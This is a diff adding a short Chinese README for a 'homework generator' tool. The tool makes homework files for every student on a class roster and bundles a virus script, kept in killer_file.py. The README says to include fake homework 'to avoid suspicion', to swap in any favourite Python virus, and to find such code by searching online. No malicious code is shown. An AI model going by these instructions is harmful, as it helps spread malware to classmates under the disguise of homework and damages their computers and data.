@@ -1,0 +1,8 @@
+先点击“python-3.10.5.exe”，之后勾选Add python3.10 to path（一定要勾选，不然用不了），然后点击install now，完成安装后右键“作业生成器”，选择 edit with IDLE，之后选择edit with IDLE 3.10.5
+在homework_True.py内填入正确作业，在homework_False内填入错误作业（避免怀疑）
+打开“作业生成器.py”，按下f5按键（或者点击run，之后点击run modle），在花名册内复制你们全班的人名，人名与人名之间必须要有换行
+在弹出的界面内输入你们班的年级和班号，之后按回车（换行），生成出来的作业在作业文件夹内
+如果有自己喜欢的病毒脚本，可以复制粘贴到“killer_file.py”内，将默认病毒脚本删除即可，注意：病毒代码必须是python代码。
+（推荐寻找方法：在网络上搜索python病毒代码）
+作者：小嗨同学
+https://space.bilibili.com/1152013668?spm_id_from=333.1007.0.0
